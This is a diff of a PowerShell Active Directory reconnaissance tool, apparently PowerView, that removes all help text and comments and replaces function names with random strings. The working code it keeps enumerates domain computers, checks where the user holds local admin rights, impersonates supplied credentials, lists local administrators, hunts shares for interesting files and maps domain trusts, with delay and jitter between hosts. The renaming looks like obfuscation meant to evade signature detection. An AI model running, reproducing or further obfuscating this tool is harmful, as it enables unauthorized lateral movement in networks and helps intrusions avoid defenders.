                             if (($ShareName) -and ($ShareName.Trim() -ne '')) {
-                                # skip this share if it's in the exclude list
+                                
                                 if ($ExcludedShares -NotContains $ShareName) {
-                                    # check if the user has access to this path
+                                    
                                     try {
                                         $Null = [IO.Directory]::GetFiles($Path)
                                         $SearchShares += $Path
@@ -18740,49 +11485,49 @@ PowerView.FoundFile
                     if ($CheckWriteAccess) {
                         $SearchArgs['CheckWriteAccess'] = $CheckWriteAccess
                     }
-                    Find-InterestingFile @SearchArgs
+                    9AZ4NGYT @SearchArgs
                 }
             }
 
             if ($TokenHandle) {
-                Invoke-RevertToSelf
+                JCUMHZOK
             }
         }
 
         $LogonToken = $Null
         if ($PSBoundParameters['Credential']) {
             if ($PSBoundParameters['Delay'] -or $PSBoundParameters['StopOnSuccess']) {
-                $LogonToken = Invoke-UserImpersonation -Credential $Credential
+                $LogonToken = ECK2AE5S -Credential $Credential
             }
             else {
-                $LogonToken = Invoke-UserImpersonation -Credential $Credential -Quiet
+                $LogonToken = ECK2AE5S -Credential $Credential -Quiet
             }
         }
     }
 
     PROCESS {
-        # only ignore threading if -Delay is passed
+        
         if ($PSBoundParameters['Delay'] -or $PSBoundParameters['StopOnSuccess']) {
 
-            Write-Verbose "[Find-InterestingDomainShareFile] Total number of hosts: $($TargetComputers.count)"
-            Write-Verbose "[Find-InterestingDomainShareFile] Delay: $Delay, Jitter: $Jitter"
+            Write-Verbose "[Q2OLEVLP] Total number of hosts: $($TargetComputers.count)"
+            Write-Verbose "[Q2OLEVLP] Delay: $Delay, Jitter: $Jitter"
             $Counter = 0
             $RandNo = New-Object System.Random
 
             ForEach ($TargetComputer in $TargetComputers) {
                 $Counter = $Counter + 1
 
-                # sleep for our semi-randomized interval
+                
                 Start-Sleep -Seconds $RandNo.Next((1-$Jitter)*$Delay, (1+$Jitter)*$Delay)
 
-                Write-Verbose "[Find-InterestingDomainShareFile] Enumerating server $TargetComputer ($Counter of $($TargetComputers.count))"
+                Write-Verbose "[Q2OLEVLP] Enumerating server $TargetComputer ($Counter of $($TargetComputers.count))"
                 Invoke-Command -ScriptBlock $HostEnumBlock -ArgumentList $TargetComputer, $Include, $ExcludedShares, $OfficeDocs, $ExcludeHidden, $FreshEXEs, $CheckWriteAccess, $LogonToken
             }
         }
         else {
-            Write-Verbose "[Find-InterestingDomainShareFile] Using threading with threads: $Threads"
+            Write-Verbose "[Q2OLEVLP] Using threading with threads: $Threads"
 
-            # if we're using threading, kick off the script block with New-ThreadedFunction
+            
             $ScriptParams = @{
                 'Include' = $Include
                 'ExcludedShares' = $ExcludedShares
@@ -18793,141 +11538,21 @@ PowerView.FoundFile
                 'TokenHandle' = $LogonToken
             }
 
-            # if we're using threading, kick off the script block with New-ThreadedFunction using the $HostEnumBlock + params
-            New-ThreadedFunction -ComputerName $TargetComputers -ScriptBlock $HostEnumBlock -ScriptParameters $ScriptParams -Threads $Threads
+            
+            24K6KC7J -ComputerName $TargetComputers -ScriptBlock $HostEnumBlock -ScriptParameters $ScriptParams -Threads $Threads
         }
     }
 
     END {
         if ($LogonToken) {
-            Invoke-RevertToSelf -TokenHandle $LogonToken
+            JCUMHZOK -TokenHandle $LogonToken
         }
     }
 }
 
 
-function Find-LocalAdminAccess {
-<#
-.SYNOPSIS
+function 0S4DJPRO {
 
-Finds machines on the local domain where the current user has local administrator access.
-
-Author: Will Schroeder (@harmj0y)  
-License: BSD 3-Clause  
-Required Dependencies: Get-DomainComputer, Invoke-UserImpersonation, Invoke-RevertToSelf, Test-AdminAccess, New-ThreadedFunction  
-
-.DESCRIPTION
-
-This function enumerates all machines on the current (or specified) domain
-using Get-DomainComputer, and for each computer it checks if the current user
-has local administrator access using Test-AdminAccess. If -Credential is passed,
-then Invoke-UserImpersonation is used to impersonate the specified user
-before enumeration, reverting after with Invoke-RevertToSelf.
-
-Idea adapted from the local_admin_search_enum post module in Metasploit written by:
-    'Brandon McCann "zeknox" <bmccann[at]accuvant.com>'
-    'Thomas McCarthy "smilingraccoon" <smilingraccoon[at]gmail.com>'
-    'Royce Davis "r3dy" <rdavis[at]accuvant.com>'
-
-.PARAMETER ComputerName
-
-Specifies an array of one or more hosts to enumerate, passable on the pipeline.
-If -ComputerName is not passed, the default behavior is to enumerate all machines
-in the domain returned by Get-DomainComputer.
-
-.PARAMETER ComputerDomain
-
-Specifies the domain to query for computers, defaults to the current domain.
-
-.PARAMETER ComputerLDAPFilter
-
-Specifies an LDAP query string that is used to search for computer objects.
-
-.PARAMETER ComputerSearchBase
-
-Specifies the LDAP source to search through for computers,
-e.g. "LDAP://OU=secret,DC=testlab,DC=local". Useful for OU queries.
-
-.PARAMETER ComputerOperatingSystem
-
-Search computers with a specific operating system, wildcards accepted.
-
-.PARAMETER ComputerServicePack
-
-Search computers with a specific service pack, wildcards accepted.
-
-.PARAMETER ComputerSiteName
-
-Search computers in the specific AD Site name, wildcards accepted.
-
-.PARAMETER CheckShareAccess
-
-Switch. Only display found shares that the local user has access to.
-
-.PARAMETER Server
-
-Specifies an Active Directory server (domain controller) to bind to.
-
-.PARAMETER SearchScope
-
-Specifies the scope to search under for computers, Base/OneLevel/Subtree (default of Subtree).
-
-.PARAMETER ResultPageSize
-
-Specifies the PageSize to set for the LDAP searcher object.
-
-.PARAMETER ServerTimeLimit
-
-Specifies the maximum amount of time the server spends searching. Default of 120 seconds.
-
-.PARAMETER Tombstone
-
-Switch. Specifies that the searcher should also return deleted/tombstoned objects.
-
-.PARAMETER Credential
-
-A [Management.Automation.PSCredential] object of alternate credentials
-for connection to the target domain and target systems.
-
-.PARAMETER Delay
-
-Specifies the delay (in seconds) between enumerating hosts, defaults to 0.
-
-.PARAMETER Jitter
-
-Specifies the jitter (0-1.0) to apply to any specified -Delay, defaults to +/- 0.3
-
-.PARAMETER Threads
-
-The number of threads to use for user searching, defaults to 20.
-
-.EXAMPLE
-
-Find-LocalAdminAccess
-
-Finds machines in the current domain the current user has admin access to.
-
-.EXAMPLE
-
-Find-LocalAdminAccess -Domain dev.testlab.local
-
-Finds machines in the dev.testlab.local domain the current user has admin access to.
-
-.EXAMPLE
-
-$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
-$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
-Find-LocalAdminAccess -Domain testlab.local -Credential $Cred
-
-Finds machines in the testlab.local domain that the user with the specified -Credential
-has admin access to.
-
-.OUTPUTS
-
-String
-
-Computer dnshostnames the current user has administrative access to.
-#>
 
     [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
     [OutputType([String])]
@@ -19026,28 +11651,28 @@ Computer dnshostnames the current user has administrative access to.
             $TargetComputers = $ComputerName
         }
         else {
-            Write-Verbose '[Find-LocalAdminAccess] Querying computers in the domain'
-            $TargetComputers = Get-DomainComputer @ComputerSearcherArguments | Select-Object -ExpandProperty dnshostname
+            Write-Verbose '[0S4DJPRO] Querying computers in the domain'
+            $TargetComputers = VVVCIHJ3 @ComputerSearcherArguments | Select-Object -ExpandProperty dnshostname
         }
-        Write-Verbose "[Find-LocalAdminAccess] TargetComputers length: $($TargetComputers.Length)"
+        Write-Verbose "[0S4DJPRO] TargetComputers length: $($TargetComputers.Length)"
         if ($TargetComputers.Length -eq 0) {
-            throw '[Find-LocalAdminAccess] No hosts found to enumerate'
+            throw '[0S4DJPRO] No hosts found to enumerate'
         }
 
-        # the host enumeration block we're using to enumerate all servers
+        
         $HostEnumBlock = {
             Param($ComputerName, $TokenHandle)
 
             if ($TokenHandle) {
-                # impersonate the the token produced by LogonUser()/Invoke-UserImpersonation
-                $Null = Invoke-UserImpersonation -TokenHandle $TokenHandle -Quiet
+                
+                $Null = ECK2AE5S -TokenHandle $TokenHandle -Quiet
             }
 
             ForEach ($TargetComputer in $ComputerName) {
                 $Up = Test-Connection -Count 1 -Quiet -ComputerName $TargetComputer
                 if ($Up) {
-                    # check if the current user has local admin access to this server
-                    $Access = Test-AdminAccess -ComputerName $TargetComputer
+                    
+                    $Access = F32E8AKI -ComputerName $TargetComputer
                     if ($Access.IsAdmin) {
                         $TargetComputer
                     }
@@ -19055,181 +11680,57 @@ Computer dnshostnames the current user has administrative access to.
             }
 
             if ($TokenHandle) {
-                Invoke-RevertToSelf
+                JCUMHZOK
             }
         }
 
         $LogonToken = $Null
         if ($PSBoundParameters['Credential']) {
             if ($PSBoundParameters['Delay'] -or $PSBoundParameters['StopOnSuccess']) {
-                $LogonToken = Invoke-UserImpersonation -Credential $Credential
+                $LogonToken = ECK2AE5S -Credential $Credential
             }
             else {
-                $LogonToken = Invoke-UserImpersonation -Credential $Credential -Quiet
+                $LogonToken = ECK2AE5S -Credential $Credential -Quiet
             }
         }
     }
 
     PROCESS {
-        # only ignore threading if -Delay is passed
+        
         if ($PSBoundParameters['Delay'] -or $PSBoundParameters['StopOnSuccess']) {
 
-            Write-Verbose "[Find-LocalAdminAccess] Total number of hosts: $($TargetComputers.count)"
-            Write-Verbose "[Find-LocalAdminAccess] Delay: $Delay, Jitter: $Jitter"
+            Write-Verbose "[0S4DJPRO] Total number of hosts: $($TargetComputers.count)"
+            Write-Verbose "[0S4DJPRO] Delay: $Delay, Jitter: $Jitter"
             $Counter = 0
             $RandNo = New-Object System.Random
 
             ForEach ($TargetComputer in $TargetComputers) {
                 $Counter = $Counter + 1
 
-                # sleep for our semi-randomized interval
+                
                 Start-Sleep -Seconds $RandNo.Next((1-$Jitter)*$Delay, (1+$Jitter)*$Delay)
 
-                Write-Verbose "[Find-LocalAdminAccess] Enumerating server $TargetComputer ($Counter of $($TargetComputers.count))"
+                Write-Verbose "[0S4DJPRO] Enumerating server $TargetComputer ($Counter of $($TargetComputers.count))"
                 Invoke-Command -ScriptBlock $HostEnumBlock -ArgumentList $TargetComputer, $LogonToken
             }
         }
         else {
-            Write-Verbose "[Find-LocalAdminAccess] Using threading with threads: $Threads"
+            Write-Verbose "[0S4DJPRO] Using threading with threads: $Threads"
 
-            # if we're using threading, kick off the script block with New-ThreadedFunction
+            
             $ScriptParams = @{
                 'TokenHandle' = $LogonToken
             }
 
-            # if we're using threading, kick off the script block with New-ThreadedFunction using the $HostEnumBlock + params
-            New-ThreadedFunction -ComputerName $TargetComputers -ScriptBlock $HostEnumBlock -ScriptParameters $ScriptParams -Threads $Threads
+            
+            24K6KC7J -ComputerName $TargetComputers -ScriptBlock $HostEnumBlock -ScriptParameters $ScriptParams -Threads $Threads
         }
     }
 }
 
 
-function Find-DomainLocalGroupMember {
-<#
-.SYNOPSIS
+function V17KPZX8 {
 
-Enumerates the members of specified local group (default administrators)
-for all the targeted machines on the current (or specified) domain.
-
-Author: Will Schroeder (@harmj0y)  
-License: BSD 3-Clause  
-Required Dependencies: Get-DomainComputer, Invoke-UserImpersonation, Invoke-RevertToSelf, Get-NetLocalGroupMember, New-ThreadedFunction  
-
-.DESCRIPTION
-
-This function enumerates all machines on the current (or specified) domain
-using Get-DomainComputer, and enumerates the members of the specified local
-group (default of Administrators) for each machine using Get-NetLocalGroupMember.
-By default, the API method is used, but this can be modified with '-Method winnt'
-to use the WinNT service provider.
-
-.PARAMETER ComputerName
-
-Specifies an array of one or more hosts to enumerate, passable on the pipeline.
-If -ComputerName is not passed, the default behavior is to enumerate all machines
-in the domain returned by Get-DomainComputer.
-
-.PARAMETER ComputerDomain
-
-Specifies the domain to query for computers, defaults to the current domain.
-
-.PARAMETER ComputerLDAPFilter
-
-Specifies an LDAP query string that is used to search for computer objects.
-
-.PARAMETER ComputerSearchBase
-
-Specifies the LDAP source to search through for computers,
-e.g. "LDAP://OU=secret,DC=testlab,DC=local". Useful for OU queries.
-
-.PARAMETER ComputerOperatingSystem
-
-Search computers with a specific operating system, wildcards accepted.
-
-.PARAMETER ComputerServicePack
-
-Search computers with a specific service pack, wildcards accepted.
-
-.PARAMETER ComputerSiteName
-
-Search computers in the specific AD Site name, wildcards accepted.
-
-.PARAMETER GroupName
-
-The local group name to query for users. If not given, it defaults to "Administrators".
-
-.PARAMETER Method
-
-The collection method to use, defaults to 'API', also accepts 'WinNT'.
-
-.PARAMETER Server
-
-Specifies an Active Directory server (domain controller) to bind to.
-
-.PARAMETER SearchScope
-
-Specifies the scope to search under for computers, Base/OneLevel/Subtree (default of Subtree).
-
-.PARAMETER ResultPageSize
-
-Specifies the PageSize to set for the LDAP searcher object.
-
-.PARAMETER ServerTimeLimit
-
-Specifies the maximum amount of time the server spends searching. Default of 120 seconds.
-
-.PARAMETER Tombstone
-
-Switch. Specifies that the searcher should also return deleted/tombstoned objects.
-
-.PARAMETER Credential
-
-A [Management.Automation.PSCredential] object of alternate credentials
-for connection to the target domain and target systems.
-
-.PARAMETER Delay
-
-Specifies the delay (in seconds) between enumerating hosts, defaults to 0.
-
-.PARAMETER Jitter
-
-Specifies the jitter (0-1.0) to apply to any specified -Delay, defaults to +/- 0.3
-
-.PARAMETER Threads
-
-The number of threads to use for user searching, defaults to 20.
-
-.EXAMPLE
-
-Find-DomainLocalGroupMember
-
-Enumerates the local group memberships for all reachable machines in the current domain.
-
-.EXAMPLE
-
-Find-DomainLocalGroupMember -Domain dev.testlab.local
-
-Enumerates the local group memberships for all reachable machines the dev.testlab.local domain.
-
-.EXAMPLE
-
-$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
-$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
-Find-DomainLocalGroupMember -Domain testlab.local -Credential $Cred
-
-Enumerates the local group memberships for all reachable machines the dev.testlab.local
-domain using the alternate credentials.
-
-.OUTPUTS
-
-PowerView.LocalGroupMember.API
-
-Custom PSObject with translated group property fields from API results.
-
-PowerView.LocalGroupMember.WinNT
-
-Custom PSObject with translated group property fields from WinNT results.
-#>
 
     [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
     [OutputType('PowerView.LocalGroupMember.API')]
@@ -19336,27 +11837,27 @@ Custom PSObject with translated group property fields from WinNT results.
             $TargetComputers = $ComputerName
         }
         else {
-            Write-Verbose '[Find-DomainLocalGroupMember] Querying computers in the domain'
-            $TargetComputers = Get-DomainComputer @ComputerSearcherArguments | Select-Object -ExpandProperty dnshostname
+            Write-Verbose '[V17KPZX8] Querying computers in the domain'
+            $TargetComputers = VVVCIHJ3 @ComputerSearcherArguments | Select-Object -ExpandProperty dnshostname
         }
-        Write-Verbose "[Find-DomainLocalGroupMember] TargetComputers length: $($TargetComputers.Length)"
+        Write-Verbose "[V17KPZX8] TargetComputers length: $($TargetComputers.Length)"
         if ($TargetComputers.Length -eq 0) {
-            throw '[Find-DomainLocalGroupMember] No hosts found to enumerate'
+            throw '[V17KPZX8] No hosts found to enumerate'
         }
 
-        # the host enumeration block we're using to enumerate all servers
+        
         $HostEnumBlock = {
             Param($ComputerName, $GroupName, $Method, $TokenHandle)
 
-            # Add check if user defaults to/selects "Administrators"
+            
             if ($GroupName -eq "Administrators") {
                 $AdminSecurityIdentifier = New-Object System.Security.Principal.SecurityIdentifier([System.Security.Principal.WellKnownSidType]::BuiltinAdministratorsSid,$null)
                 $GroupName = ($AdminSecurityIdentifier.Translate([System.Security.Principal.NTAccount]).Value -split "\\")[-1]
             }
 
             if ($TokenHandle) {
-                # impersonate the the token produced by LogonUser()/Invoke-UserImpersonation
-                $Null = Invoke-UserImpersonation -TokenHandle $TokenHandle -Quiet
+                
+                $Null = ECK2AE5S -TokenHandle $TokenHandle -Quiet
             }
 
             ForEach ($TargetComputer in $ComputerName) {
@@ -19367,191 +11868,76 @@ Custom PSObject with translated group property fields from WinNT results.
                         'Method' = $Method
                         'GroupName' = $GroupName
                     }
-                    Get-NetLocalGroupMember @NetLocalGroupMemberArguments
+                    X6KG5CL9Member @NetLocalGroupMemberArguments
                 }
             }
 
             if ($TokenHandle) {
-                Invoke-RevertToSelf
+                JCUMHZOK
             }
         }
 
         $LogonToken = $Null
         if ($PSBoundParameters['Credential']) {
             if ($PSBoundParameters['Delay'] -or $PSBoundParameters['StopOnSuccess']) {
-                $LogonToken = Invoke-UserImpersonation -Credential $Credential
+                $LogonToken = ECK2AE5S -Credential $Credential
             }
             else {
-                $LogonToken = Invoke-UserImpersonation -Credential $Credential -Quiet
+                $LogonToken = ECK2AE5S -Credential $Credential -Quiet
             }
         }
     }
 
     PROCESS {
-        # only ignore threading if -Delay is passed
+        
         if ($PSBoundParameters['Delay'] -or $PSBoundParameters['StopOnSuccess']) {
 
-            Write-Verbose "[Find-DomainLocalGroupMember] Total number of hosts: $($TargetComputers.count)"
-            Write-Verbose "[Find-DomainLocalGroupMember] Delay: $Delay, Jitter: $Jitter"
+            Write-Verbose "[V17KPZX8] Total number of hosts: $($TargetComputers.count)"
+            Write-Verbose "[V17KPZX8] Delay: $Delay, Jitter: $Jitter"
             $Counter = 0
             $RandNo = New-Object System.Random
 
             ForEach ($TargetComputer in $TargetComputers) {
                 $Counter = $Counter + 1
 
-                # sleep for our semi-randomized interval
+                
                 Start-Sleep -Seconds $RandNo.Next((1-$Jitter)*$Delay, (1+$Jitter)*$Delay)
 
-                Write-Verbose "[Find-DomainLocalGroupMember] Enumerating server $TargetComputer ($Counter of $($TargetComputers.count))"
+                Write-Verbose "[V17KPZX8] Enumerating server $TargetComputer ($Counter of $($TargetComputers.count))"
                 Invoke-Command -ScriptBlock $HostEnumBlock -ArgumentList $TargetComputer, $GroupName, $Method, $LogonToken
             }
         }
         else {
-            Write-Verbose "[Find-DomainLocalGroupMember] Using threading with threads: $Threads"
+            Write-Verbose "[V17KPZX8] Using threading with threads: $Threads"
 
-            # if we're using threading, kick off the script block with New-ThreadedFunction
+            
             $ScriptParams = @{
                 'GroupName' = $GroupName
                 'Method' = $Method
                 'TokenHandle' = $LogonToken
             }
 
-            # if we're using threading, kick off the script block with New-ThreadedFunction using the $HostEnumBlock + params
-            New-ThreadedFunction -ComputerName $TargetComputers -ScriptBlock $HostEnumBlock -ScriptParameters $ScriptParams -Threads $Threads
+            
+            24K6KC7J -ComputerName $TargetComputers -ScriptBlock $HostEnumBlock -ScriptParameters $ScriptParams -Threads $Threads
         }
     }
 
     END {
         if ($LogonToken) {
-            Invoke-RevertToSelf -TokenHandle $LogonToken
+            JCUMHZOK -TokenHandle $LogonToken
         }
     }
 }
 
 
-########################################################
-#
-# Domain trust functions below.
-#
-########################################################
 
-function Get-DomainTrust {
-<#
-.SYNOPSIS
 
-Return all domain trusts for the current domain or a specified domain.
 
-Author: Will Schroeder (@harmj0y)  
-License: BSD 3-Clause  
-Required Dependencies: Get-Domain, Get-DomainSearcher, Get-DomainSID, PSReflect  
 
-.DESCRIPTION
 
-This function will enumerate domain trust relationships for the current (or a remote)
-domain using a number of methods. By default, and LDAP search using the filter
-'(objectClass=trustedDomain)' is used- if any LDAP-appropriate parameters are specified
-LDAP is used as well. If the -NET flag is specified, the .NET method
-GetAllTrustRelationships() is used on the System.DirectoryServices.ActiveDirectory.Domain
-object. If the -API flag is specified, the Win32 API DsEnumerateDomainTrusts() call is
-used to enumerate instead.
 
-.PARAMETER Domain
+function 8JBV20VH {
 
-Specifies the domain to query for trusts, defaults to the current domain.
-
-.PARAMETER API
-
-Switch. Use an API call (DsEnumerateDomainTrusts) to enumerate the trusts instead of the built-in
-.NET methods.
-
-.PARAMETER NET
-
-Switch. Use .NET queries to enumerate trusts instead of the default LDAP method.
-
-.PARAMETER LDAPFilter
-
-Specifies an LDAP query string that is used to filter Active Directory objects.
-
-.PARAMETER Properties
-
-Specifies the properties of the output object to retrieve from the server.
-
-.PARAMETER SearchBase
-
-The LDAP source to search through, e.g. "LDAP://OU=secret,DC=testlab,DC=local"
-Useful for OU queries.
-
-.PARAMETER Server
-
-Specifies an Active Directory server (domain controller) to bind to.
-
-.PARAMETER SearchScope
-
-Specifies the scope to search under, Base/OneLevel/Subtree (default of Subtree).
-
-.PARAMETER ResultPageSize
-
-Specifies the PageSize to set for the LDAP searcher object.
-
-.PARAMETER ServerTimeLimit
-
-Specifies the maximum amount of time the server spends searching. Default of 120 seconds.
-
-.PARAMETER Tombstone
-
-Switch. Specifies that the searcher should also return deleted/tombstoned objects.
-
-.PARAMETER FindOne
-
-Only return one result object.
-
-.PARAMETER Credential
-
-A [Management.Automation.PSCredential] object of alternate credentials
-for connection to the target domain.
-
-.EXAMPLE
-
-Get-DomainTrust
-
-Return domain trusts for the current domain using built in .LDAP methods.
-
-.EXAMPLE
-
-Get-DomainTrust -NET -Domain "prod.testlab.local"
-
-Return domain trusts for the "prod.testlab.local" domain using .NET methods
-
-.EXAMPLE
-
-$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
-$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
-Get-DomainTrust -Domain "prod.testlab.local" -Server "PRIMARY.testlab.local" -Credential $Cred
-
-Return domain trusts for the "prod.testlab.local" domain enumerated through LDAP
-queries, binding to the PRIMARY.testlab.local server for queries, and using the specified
-alternate credenitals.
-
-.EXAMPLE
-
-Get-DomainTrust -API -Domain "prod.testlab.local"
-
-Return domain trusts for the "prod.testlab.local" domain enumerated through API calls.
-
-.OUTPUTS
-
-PowerView.DomainTrust.LDAP
-
-Custom PSObject with translated domain LDAP trust result fields (default).
-
-PowerView.DomainTrust.NET
-
-A TrustRelationshipInformationCollection returned when using .NET methods.
-
-PowerView.DomainTrust.API
-
-Custom PSObject with translated domain API trust result fields.
-#>
 
     [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
     [OutputType('PowerView.DomainTrust.NET')]
@@ -19679,9 +12065,9 @@ Custom PSObject with translated domain API trust result fields.
         }
 
         if ($PsCmdlet.ParameterSetName -eq 'LDAP') {
-            # if we're searching for domain trusts through LDAP/ADSI
-            $TrustSearcher = Get-DomainSearcher @LdapSearcherArguments
-            $SourceSID = Get-DomainSID @NetSearcherArguments
+            
+            $TrustSearcher = NJUXTHTL @LdapSearcherArguments
+            $SourceSID = I2HD47RA @NetSearcherArguments
 
             if ($TrustSearcher) {
 
@@ -19731,7 +12117,7 @@ Custom PSObject with translated domain API trust result fields.
 
                     $DomainTrust | Add-Member Noteproperty 'SourceName' $SourceDomain
                     $DomainTrust | Add-Member Noteproperty 'TargetName' $Props.name[0]
-                    # $DomainTrust | Add-Member Noteproperty 'TargetGuid' "{$ObjectGuid}"
+                    
                     $DomainTrust | Add-Member Noteproperty 'TrustType' $TrustType
                     $DomainTrust | Add-Member Noteproperty 'TrustAttributes' $($TrustAttrib -join ',')
                     $DomainTrust | Add-Member Noteproperty 'TrustDirection' "$Direction"
@@ -19743,14 +12129,14 @@ Custom PSObject with translated domain API trust result fields.
                 if ($Results) {
                     try { $Results.dispose() }
                     catch {
-                        Write-Verbose "[Get-DomainTrust] Error disposing of the Results object: $_"
+                        Write-Verbose "[8JBV20VH] Error disposing of the Results object: $_"
                     }
                 }
                 $TrustSearcher.dispose()
             }
         }
         elseif ($PsCmdlet.ParameterSetName -eq 'API') {
-            # if we're searching for domain trusts through Win32 API functions
+            
             if ($PSBoundParameters['Server']) {
                 $TargetDC = $Server
             }
@@ -19758,32 +12144,32 @@ Custom PSObject with translated domain API trust result fields.
                 $TargetDC = $Domain
             }
             else {
-                # see https://msdn.microsoft.com/en-us/library/ms675976(v=vs.85).aspx for default NULL behavior
+                
                 $TargetDC = $Null
             }
 
-            # arguments for DsEnumerateDomainTrusts
+            
             $PtrInfo = [IntPtr]::Zero
 
-            # 63 = DS_DOMAIN_IN_FOREST + DS_DOMAIN_DIRECT_OUTBOUND + DS_DOMAIN_TREE_ROOT + DS_DOMAIN_PRIMARY + DS_DOMAIN_NATIVE_MODE + DS_DOMAIN_DIRECT_INBOUND
+            
             $Flags = 63
             $DomainCount = 0
 
-            # get the trust information from the target server
+            
             $Result = $Netapi32::DsEnumerateDomainTrusts($TargetDC, $Flags, [ref]$PtrInfo, [ref]$DomainCount)
 
-            # Locate the offset of the initial intPtr
+            
             $Offset = $PtrInfo.ToInt64()
 
-            # 0 = success
+            
             if (($Result -eq 0) -and ($Offset -gt 0)) {
 
-                # Work out how much to increment the pointer by finding out the size of the structure
+                
                 $Increment = $DS_DOMAIN_TRUSTS::GetSize()
 
-                # parse all the result structures
+                
                 for ($i = 0; ($i -lt $DomainCount); $i++) {
-                    # create a new int ptr at the given offset and cast the pointer as our result structure
+                    
                     $NewIntPtr = New-Object System.Intptr -ArgumentList $Offset
                     $Info = $NewIntPtr -as $DS_DOMAIN_TRUSTS
 
@@ -19794,7 +12180,7 @@ Custom PSObject with translated domain API trust result fields.
                     $Result = $Advapi32::ConvertSidToStringSid($Info.DomainSid, [ref]$SidString);$LastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
 
                     if ($Result -eq 0) {
-                        Write-Verbose "[Get-DomainTrust] Error: $(([ComponentModel.Win32Exception] $LastError).Message)"
+                        Write-Verbose "[8JBV20VH] Error: $(([ComponentModel.Win32Exception] $LastError).Message)"
                     }
                     else {
                         $DomainTrust = New-Object PSObject
@@ -19811,15 +12197,15 @@ Custom PSObject with translated domain API trust result fields.
                         $DomainTrust
                     }
                 }
-                # free up the result buffer
+                
                 $Null = $Netapi32::NetApiBufferFree($PtrInfo)
             }
             else {
-                Write-Verbose "[Get-DomainTrust] Error: $(([ComponentModel.Win32Exception] $Result).Message)"
+                Write-Verbose "[8JBV20VH] Error: $(([ComponentModel.Win32Exception] $Result).Message)"
             }
         }
         else {
-            # if we're searching for domain trusts through .NET methods
+            
             $FoundDomain = Get-Domain @NetSearcherArguments
             if ($FoundDomain) {
                 $FoundDomain.GetAllTrustRelationships() | ForEach-Object {
@@ -19832,57 +12218,8 @@ Custom PSObject with translated domain API trust result fields.
 }
 
 
-function Get-ForestTrust {
-<#
-.SYNOPSIS
+function SVUMSAEL {
 
-Return all forest trusts for the current forest or a specified forest.
-
-Author: Will Schroeder (@harmj0y)  
-License: BSD 3-Clause  
-Required Dependencies: Get-Forest  
-
-.DESCRIPTION
-
-This function will enumerate domain trust relationships for the current (or a remote)
-forest using number of method using the .NET method GetAllTrustRelationships() on a
-System.DirectoryServices.ActiveDirectory.Forest returned by Get-Forest.
-
-.PARAMETER Forest
-
-Specifies the forest to query for trusts, defaults to the current forest.
-
-.PARAMETER Credential
-
-A [Management.Automation.PSCredential] object of alternate credentials
-for connection to the target domain.
-
-.EXAMPLE
-
-Get-ForestTrust
-
-Return current forest trusts.
-
-.EXAMPLE
-
-Get-ForestTrust -Forest "external.local"
-
-Return trusts for the "external.local" forest.
-
-.EXAMPLE
-
-$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
-$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
-Get-ForestTrust -Forest "external.local" -Credential $Cred
-
-Return trusts for the "external.local" forest using the specified alternate credenitals.
-
-.OUTPUTS
-
-PowerView.DomainTrust.NET
-
-A TrustRelationshipInformationCollection returned when using .NET methods (default).
-#>
 
     [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
     [OutputType('PowerView.ForestTrust.NET')]
@@ -19916,101 +12253,8 @@ A TrustRelationshipInformationCollection returned when using .NET methods (defau
 }
 
 
-function Get-DomainForeignUser {
-<#
-.SYNOPSIS
+function SZAAOS2T {
 
-Enumerates users who are in groups outside of the user's domain.
-This is a domain's "outgoing" access.
-
-Author: Will Schroeder (@harmj0y)  
-License: BSD 3-Clause  
-Required Dependencies: Get-Domain, Get-DomainUser  
-
-.DESCRIPTION
-
-Uses Get-DomainUser to enumerate all users for the current (or target) domain,
-then calculates the given user's domain name based on the user's distinguishedName.
-This domain name is compared to the queried domain, and the user object is
-output if they differ.
-
-.PARAMETER Domain
-
-Specifies the domain to use for the query, defaults to the current domain.
-
-.PARAMETER LDAPFilter
-
-Specifies an LDAP query string that is used to filter Active Directory objects.
-
-.PARAMETER Properties
-
-Specifies the properties of the output object to retrieve from the server.
-
-.PARAMETER SearchBase
-
-The LDAP source to search through, e.g. "LDAP://OU=secret,DC=testlab,DC=local"
-Useful for OU queries.
-
-.PARAMETER Server
-
-Specifies an Active Directory server (domain controller) to bind to.
-
-.PARAMETER SearchScope
-
-Specifies the scope to search under, Base/OneLevel/Subtree (default of Subtree).
-
-.PARAMETER ResultPageSize
-
-Specifies the PageSize to set for the LDAP searcher object.
-
-.PARAMETER ServerTimeLimit
-
-Specifies the maximum amount of time the server spends searching. Default of 120 seconds.
-
-.PARAMETER SecurityMasks
-
-Specifies an option for examining security information of a directory object.
-One of 'Dacl', 'Group', 'None', 'Owner', 'Sacl'.
-
-.PARAMETER Tombstone
-
-Switch. Specifies that the searcher should also return deleted/tombstoned objects.
-
-.PARAMETER Credential
-
-A [Management.Automation.PSCredential] object of alternate credentials
-for connection to the target domain.
-
-.EXAMPLE
-
-Get-DomainForeignUser
-
-Return all users in the current domain who are in groups not in the
-current domain.
-
-.EXAMPLE
-
-Get-DomainForeignUser -Domain dev.testlab.local
-
-Return all users in the dev.testlab.local domain who are in groups not in the
-dev.testlab.local domain.
-
-.EXAMPLE
-
-$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
-$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
-Get-DomainForeignUser -Domain dev.testlab.local -Server secondary.dev.testlab.local -Credential $Cred
-
-Return all users in the dev.testlab.local domain who are in groups not in the
-dev.testlab.local domain, binding to the secondary.dev.testlab.local for queries, and
-using the specified alternate credentials.
-
-.OUTPUTS
-
-PowerView.ForeignUser
-
-Custom PSObject with translated user property fields.
-#>
 
     [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
     [OutputType('PowerView.ForeignUser')]
